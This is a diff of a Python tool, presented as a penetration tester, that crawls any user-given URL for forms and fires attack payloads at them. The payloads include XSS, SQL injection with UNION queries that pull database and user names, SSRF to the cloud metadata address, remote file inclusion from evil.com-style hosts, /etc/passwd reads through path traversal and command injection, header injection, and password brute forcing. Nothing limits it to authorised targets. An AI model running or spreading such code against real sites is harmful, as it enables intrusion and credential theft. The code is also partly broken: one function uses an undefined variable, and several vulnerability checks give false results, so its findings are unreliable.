@@ -14,10 +14,10 @@
 import requests
 from bs4 import BeautifulSoup
 import os
-import subprocess
 import matplotlib.pyplot as plt
-from urllib.parse import urlparse, urljoin
+from urllib.parse import urlparse, urljoin, quote
 import base64
+import html
 
 # Banner
 def print_banner():
@@ -50,7 +50,6 @@ def print_banner():
     """
     print(banner)
 
-
 # Log function to keep track of test results
 def log_result(test_type, result, message, url, field=None):
     field_info = f" | Field: {field}" if field else ""
@@ -64,146 +63,283 @@ def is_within_domain(base_url, link):
     link_domain = urlparse(urljoin(base_url, link)).netloc
     return base_domain == link_domain
 
-# Crawl Website and Discover Links and Forms
-def crawl_website(url, visited=None):
+# Crawl Website for Forms and Hidden Forms
+def crawl_for_forms(url, visited=None):
     if visited is None:
         visited = set()
     if url in visited:
-        return
+        return visited
     visited.add(url)
-    print(f"Crawling URL: {url}")
+    print(f"Crawling URL for forms: {url}")
     try:
         response = requests.get(url)
         response.raise_for_status()
     except requests.exceptions.RequestException as e:
         log_result("Crawl", "Error", f"Error crawling {url}: {e}", url)
-        return
+        return visited
+    
     soup = BeautifulSoup(response.text, 'html.parser')
-    # Find all links
-    links = [a['href'] for a in soup.find_all('a', href=True) if is_within_domain(url, a['href'])]
-    # Find all forms
     forms = soup.find_all('form')
+    
+    form_details_list = []
     for form in forms:
-        log_result("Form Found", "Info", str(form), url)
-    for link in links:
-        if link.startswith('/'):
-            link = urljoin(url, link)
-        if is_within_domain(url, link):
-            crawl_website(link, visited)
+        action = form.get('action')
+        method = form.get('method', 'get').lower()
+        inputs = form.find_all('input')
+        
+        form_details = {
+            'action': action,
+            'method': method,
+            'inputs': {input_tag.get('name'): input_tag.get('type', 'text') for input_tag in inputs}
+        }
+        log_result("Form Found", "Info", str(form_details), url)
+        form_details_list.append(form_details)
+    
+    return form_details_list
 
-# Obfuscate payloads by encoding them in Base64
+# Obfuscate payloads using different methods
 def obfuscate_payload(payload):
-    return base64.b64encode(payload.encode()).decode()
+    return [
+        payload,  # Original payload
+        base64.b64encode(payload.encode()).decode(),  # Base64 encoding
+        quote(payload),  # URL encoding
+        html.escape(payload)  # HTML entity encoding
+    ]
 
-# XSS Testing
-def xss_test(url):
+# XSS Testing for both stored and reflected XSS
+def xss_test(url, forms):
     payloads = [
         "<script>alert('XSS');</script>",
         "<img src=x onerror=alert('XSS')>",
-        "<body onload=alert('XSS')>"
+        "<body onload=alert('XSS')>",
+        "<svg/onload=alert('XSS')>",
+        "\";alert('XSS');//",
+        "';alert('XSS');",
+        "<iframe src=javascript:alert('XSS')>",
+        "<math><mi><mo><mtext><mn><ms><mtext><mglyph><malignmark><maligngroup><ms><mtext>&lt;script&gt;alert('XSS')&lt;/script&gt;</mtext></ms></maligngroup></malignmark></mglyph></mn></mtext></mo></mi></math>",
+        "<script>alert(String.fromCharCode(88,83,83))</script>",
     ]
-    for payload in payloads:
-        obfuscated_payload = obfuscate_payload(payload)
-        response = requests.post(url, data={"input_field": obfuscated_payload})
+    
+    def check_response(response, payload):
         if payload in response.text:
-            log_result("XSS Test", "Vulnerable", f"XSS vulnerability detected with payload {payload}", url, "input_field")
-        else:
-            log_result("XSS Test", "Not Vulnerable", f"No XSS vulnerability detected with payload {payload}", url, "input_field")
+            return True
+        # Additional header check
+        for header in response.headers.values():
+            if payload in header:
+                return True
+        return False
+    
+    for form in forms:
+        action = form['action']
+        method = form['method']
+        inputs = form['inputs']
+        
+        for payload in payloads:
+            obfuscated_payloads = obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
+                if method == 'post':
+                    response = requests.post(urljoin(url, action), data=data)
+                else:
+                    response = requests.get(urljoin(url, action), params=data)
+                
+                if check_response(response, payload):
+                    log_result("XSS Test", "Vulnerable", f"XSS vulnerability detected with payload {payload}", url, action)
+                    return
+    log_result("XSS Test", "Not Vulnerable", f"No XSS vulnerability detected", url)
 
 # SQL Injection Testing for both parameters and headers
-def sql_injection_test(url):
+def sql_injection_test(url, forms):
     payloads = [
         "' OR '1'='1",
         "' OR '1'='1' --",
         "' OR '1'='1' /*",
         "' OR 1=1 --"
     ]
+    modulating_payloads = [
+        "' UNION SELECT 1,2,3,4,5,6,concat(database(),system_user(),@@version)-- -",
+        "' UNION SELECT NULL, NULL, NULL, NULL, NULL, concat(database(), system_user(), @@version)-- -"
+    ]
     headers = {
         "User-Agent": "Mozilla/5.0",
         "Referer": "http://example.com",
         "X-Forwarded-For": "127.0.0.1"
     }
-    for payload in payloads:
-        obfuscated_payload = obfuscate_payload(payload)
-        # Test parameters
-        response = requests.post(url, data={"item": obfuscated_payload, "search": ""})
-        if "error" in response.text.lower() or "mysql" in response.text.lower():
-            log_result("SQL Injection Test", "Vulnerable", f"SQL Injection vulnerability detected with payload {payload}", url, "item")
-            return
+    
+    for form in forms:
+        action = form['action']
+        method = form['method']
+        inputs = form['inputs']
         
-        # Test headers
-        for field in headers:
-            modified_headers = headers.copy()
-            modified_headers[field] += f" {obfuscated_payload}"
-            response = requests.get(url, headers=modified_headers)
-            if "error" in response.text.lower() or "mysql" in response.text.lower():
-                log_result("SQL Injection Test", "Vulnerable", f"SQL Injection vulnerability detected with payload {payload}", url, field)
-                return
-
+        for payload in payloads:
+            obfuscated_payloads = obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
+                
+                if method == 'post':
+                    response = requests.post(urljoin(url, action), data=data)
+                else:
+                    response = requests.get(urljoin(url, action), params=data)
+                
+                if "error" in response.text.lower() or "mysql" in response.text.lower():
+                    log_result("SQL Injection Test", "Vulnerable", f"SQL Injection vulnerability detected with payload {payload}", url, action)
+                    # Test modulating payloads
+                    for mod_payload in modulating_payloads:
+                        mod_obfuscated_payloads = obfuscate_payload(mod_payload)
+                        for mod_obfuscated_payload in mod_obfuscated_payloads:
+                            data = {key: mod_obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
+                            if method == 'post':
+                                response = requests.post(urljoin(url, action), data=data)
+                            else:
+                                response = requests.get(urljoin(url, action), params=data)
+                            if "database" in response.text.lower() or "version" in response.text.lower():
+                                log_result("SQL Injection Test", "Vulnerable", f"Modulating SQL Injection payload executed: {mod_payload}", url, action)
+                                return
+    
     log_result("SQL Injection Test", "Not Vulnerable", f"No SQL Injection vulnerability detected", url)
 
 # SSRF Testing
-def ssrf_test(url):
+def ssrf_test(url, forms):
     payloads = [
         "http://localhost:8080",
         "http://127.0.0.1:8080",
         "http://169.254.169.254"
     ]
-    for payload in payloads:
-        obfuscated_payload = obfuscate_payload(payload)
-        response = requests.get(url, params={"url": obfuscated_payload})
-        if "error" in response.text.lower():
-            log_result("SSRF Test", "Vulnerable", f"SSRF vulnerability detected with payload {payload}", url, "url")
-            return
-    log_result("SSRF Test", "Not Vulnerable", f"No SSRF vulnerability detected", url, "url")
+    modulating_payloads = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://localhost/admin"
+    ]
+    
+    for form in forms:
+        action = form['action']
+        method = form['method']
+        inputs = form['inputs']
+        
+        for payload in payloads:
+            obfuscated_payloads = obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
+                if method == 'post':
+                    response = requests.post(urljoin(url, action), data=data)
+                else:
+                    response = requests.get(urljoin(url, action), params=data)
+                
+                if "error" in response.text.lower():
+                    log_result("SSRF Test", "Vulnerable", f"SSRF vulnerability detected with payload {payload}", url, action)
+                    # Test modulating payloads
+                    for mod_payload in modulating_payloads:
+                        mod_obfuscated_payloads = obfuscate_payload(mod_payload)
+                        for mod_obfuscated_payload in mod_obfuscated_payloads:
+                            data = {key: mod_obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
+                            if method == 'post':
+                                response = requests.post(urljoin(url, action), data=data)
+                            else:
+                                response = requests.get(urljoin(url, action), params=data)
+                            if any(keyword in response.text.lower() for keyword in ["meta-data", "admin"]):
+                                log_result("SSRF Test", "Vulnerable", f"Modulating SSRF payload executed: {mod_payload}", url, action)
+                                return
+    log_result("SSRF Test", "Not Vulnerable", f"No SSRF vulnerability detected", url)
 
 # RFI Testing
-def rfi_test(url):
+def rfi_test(url, forms):
     payloads = [
         "http://example.com/malicious_file",
         "http://evil.com/evil_script",
         "http://attacker.com/backdoor"
     ]
-    for payload in payloads:
-        obfuscated_payload = obfuscate_payload(payload)
-        response = requests.get(url, params={"file": obfuscated_payload})
-        if "error" in response.text.lower():
-            log_result("RFI Test", "Vulnerable", f"RFI vulnerability detected with payload {payload}", url, "file")
-            return
-    log_result("RFI Test", "Not Vulnerable", f"No RFI vulnerability detected", url, "file")
+    
+    for form in forms:
+        action = form['action']
+        method = form['method']
+        inputs = form['inputs']
+        
+        for payload in payloads:
+            obfuscated_payloads = obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
+                if method == 'post':
+                    response = requests.post(urljoin(url, action), data=data)
+                else:
+                    response = requests.get(urljoin(url, action), params=data)
+                
+                if "error" in response.text.lower():
+                    log_result("RFI Test", "Vulnerable", f"RFI vulnerability detected with payload {payload}", url, action)
+                    return
+    log_result("RFI Test", "Not Vulnerable", f"No RFI vulnerability detected", url)
 
 # LFI Testing
-def lfi_test(url):
+def lfi_test(url, forms):
     payloads = [
         "../../../../etc/passwd",
         "../../../../../etc/passwd",
         "../../../../../../etc/passwd"
     ]
-    for payload in payloads:
-        obfuscated_payload = obfuscate_payload(payload)
-        response = requests.get(url, params={"file": obfuscated_payload})
-        if "root" in response.text:
-            log_result("LFI Test", "Vulnerable", f"LFI vulnerability detected with payload {payload}", url, "file")
-            return
-    log_result("LFI Test", "Not Vulnerable", f"No LFI vulnerability detected", url, "file")
+    
+    for form in forms:
+        action = form['action']
+        method = form['method']
+        inputs = form['inputs']
+        
+        for payload in payloads:
+            obfuscated_payloads = obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
+                if method == 'post':
+                    response = requests.post(urljoin(url, action), data=data)
+                else:
+                    response = requests.get(urljoin(url, action), params=data)
+                
+                if "root" in response.text:
+                    log_result("LFI Test", "Vulnerable", f"LFI vulnerability detected with payload {payload}", url, action)
+                    return
+    log_result("LFI Test", "Not Vulnerable", f"No LFI vulnerability detected", url)
 
 # Command Injection Testing
-def command_injection_test(url):
+def command_injection_test(url, forms):
     payloads = [
         "id; ls",
         "whoami; cat /etc/passwd",
-        "uname -a; ls -la"
+        "uname -a; ls -la",
+        "`id`",
+        "$(id)",
+        "`uname -a`",
+        "&& whoami",
+        "|| uname -a",
+        "| id",
+        ";& id",
+        "|& id",
+        "%0A id",
+        "%0A uname -a"
     ]
-    for payload in payloads:
-        obfuscated_payload = obfuscate_payload(payload)
-        response = requests.get(url, params={"cmd": obfuscated_payload})
-        if any(keyword in response.text for keyword in ["uid", "root", "Linux"]):
-            log_result("Command Injection Test", "Vulnerable", f"Command injection detected with payload {payload}", url, "cmd")
-            return
-    log_result("Command Injection Test", "Not Vulnerable", f"No command injection detected", url, "cmd")
+    
+    def check_response(response):
+        keywords = ["uid=", "root", "Linux", "id", "whoami"]
+        for keyword in keywords:
+            if keyword in response.text:
+                return True
+        return False
+    
+    for form in forms:
+        action = form['action']
+        method = form['method']
+        inputs = form['inputs']
+        
+        for payload in payloads:
+            obfuscated_payloads = obfuscate_payload(payload)
+            for obfuscated_payload in obfuscated_payloads:
+                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
+                if method == 'post':
+                    response = requests.post(urljoin(url, action), data=data)
+                else:
+                    response = requests.get(urljoin(url, action), params=data)
+                
+                if check_response(response):
+                    log_result("Command Injection Test", "Vulnerable", f"Command injection detected with payload {payload}", url, action)
+                    return
+    log_result("Command Injection Test", "Not Vulnerable", f"No command injection detected", url)
 
 # Header Injection Testing
-def header_injection_test(url):
+def header_injection_test(url, forms):
     headers = {
         "User-Agent": "Mozilla/5.0",
         "Referer": "http://example.com",
@@ -215,39 +351,52 @@ def header_injection_test(url):
         "%0d%0aX-Test: injected-header",
         "%0aX-Test: injected-header"
     ]
-    for field in headers:
-        for payload in payloads:
-            modified_headers = headers.copy()
-            modified_headers[field] += payload
-            response = requests.get(url, headers=modified_headers)
-            if "X-Test: injected-header" in response.text:
-                log_result("Header Injection Test", "Vulnerable", f"Header injection detected with payload {payload}", url, field)
-                return
+    
+    for form in forms:
+        action = form['action']
+        method = form['method']
+        inputs = form['inputs']
+        
+        for field in headers:
+            for payload in payloads:
+                obfuscated_payloads = obfuscate_payload(payload)
+                for obfuscated_payload in obfuscated_payloads:
+                    modified_headers = headers.copy()
+                    modified_headers[field] += obfuscated_payload
+                    response = requests.get(urljoin(url, action), headers=modified_headers)
+                    if "X-Test: injected-header" in response.text:
+                        log_result("Header Injection Test", "Vulnerable", f"Header injection detected with payload {payload}", url, action)
+                        return
     log_result("Header Injection Test", "Not Vulnerable", f"No header injection detected", url)
 
 # Brute Force Testing for Login Forms
-def brute_force_test(url, username, wordlist):
+def brute_force_test(url, username, wordlist, forms):
     with open(wordlist, 'r') as f:
         for password in f.readlines():
             password = password.strip()
-            obfuscated_password = obfuscate_payload(password)
-            response = requests.post(url, data={"username": username, "password": obfuscated_password})
-            if "login successful" in response.text:
-                log_result("Brute Force Test", "Vulnerable", f"Found valid credentials: {username}/{password}", url, "password")
-                break
+            obfuscated_passwords = obfuscate_payload(password)
+            for obfuscated_password in obfuscated_payloads:
+                for form in forms:
+                    action = form['action']
+                    method = form['method']
+                    data = {key: obfuscated_password if key == 'password' else username for key in form['inputs'].keys()}
+                    response = requests.post(urljoin(url, action), data=data)
+                    if "login successful" in response.text:
+                        log_result("Brute Force Test", "Vulnerable", f"Found valid credentials: {username}/{password}", url, action)
+                        return
 
 # Session Handling for Login Automation
 def login(url, username, password):
     session = requests.Session()
-    obfuscated_password = obfuscate_payload(password)
-    login_data = {"username": username, "password": obfuscated_password}
-    response = session.post(url, data=login_data)
-    if response.status_code == 200:
-        log_result("Login", "Success", f"Login successful with {username}/{password}", url, "password")
-        return session
-    else:
-        log_result("Login", "Failure", f"Login failed with {username}/{password}", url, "password")
-        return None
+    obfuscated_passwords = obfuscate_payload(password)
+    for obfuscated_password in obfuscated_passwords:
+        login_data = {"username": username, "password": obfuscated_password}
+        response = session.post(url, data=login_data)
+        if response.status_code == 200:
+            log_result("Login", "Success", f"Login successful with {username}/{password}", url, "password")
+            return session
+    log_result("Login", "Failure", f"Login failed with {username}/{password}", url, "password")
+    return None
 
 # API Testing (e.g., POST or GET requests)
 def api_test(url, method="GET", data=None):
@@ -280,43 +429,40 @@ def generate_report_chart():
 # Menu and Submenu system
 def display_menu():
     print("\nPenetration Testing Menu:")
-    print("1. Crawl Website")
-    print("2. XSS Testing")
-    print("3. SQL Injection Testing")
-    print("4. SSRF Testing")
-    print("5. RFI Testing")
-    print("6. LFI Testing")
-    print("7. Command Injection Testing")
-    print("8. Header Injection Testing")
-    print("9. Brute Force Testing")
-    print("10. Session Handling (Login Automation)")
-    print("11. API Testing")
-    print("12. Generate Report")
+    print("1. Crawl Website     2. XSS Testing        3. SQL Injection Testing")
+    print("4. SSRF Testing      5. RFI Testing        6. LFI Testing")
+    print("7. Command Injection 8. Header Injection   9. Brute Force Testing")
+    print("10. Session Handling 11. API Testing       12. Generate Report")
     print("13. Exit")
 
 def handle_menu_choice(choice):
     target_url = input("Enter target URL: ")
-    username = input("Enter username for brute force/login (if applicable): ")
-    wordlist = input("Enter wordlist file path (if applicable): ")
+    forms = crawl_for_forms(target_url)
+    if choice in [9, 10]:
+        username = input("Enter username for brute force/login (if applicable): ")
+        wordlist = input("Enter wordlist file path (if applicable): ")
+    else:
+        username = None
+        wordlist = None
 
     if choice == 1:
-        crawl_website(target_url)
+        crawl_for_forms(target_url)
     elif choice == 2:
-        xss_test(target_url)
+        xss_test(target_url, forms)
     elif choice == 3:
-        sql_injection_test(target_url)
+        sql_injection_test(target_url, forms)
     elif choice == 4:
-        ssrf_test(target_url)
+        ssrf_test(target_url, forms)
     elif choice == 5:
-        rfi_test(target_url)
+        rfi_test(target_url, forms)
     elif choice == 6:
-        lfi_test(target_url)
+        lfi_test(target_url, forms)
     elif choice == 7:
-        command_injection_test(target_url)
+        command_injection_test(target_url, forms)
     elif choice == 8:
-        header_injection_test(target_url)
+        header_injection_test(target_url, forms)
     elif choice == 9:
-        brute_force_test(target_url, username, wordlist)
+        brute_force_test(target_url, username, wordlist, forms)
     elif choice == 10:
         session = login(target_url, username, "password")
         if session:
@@ -341,4 +487,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
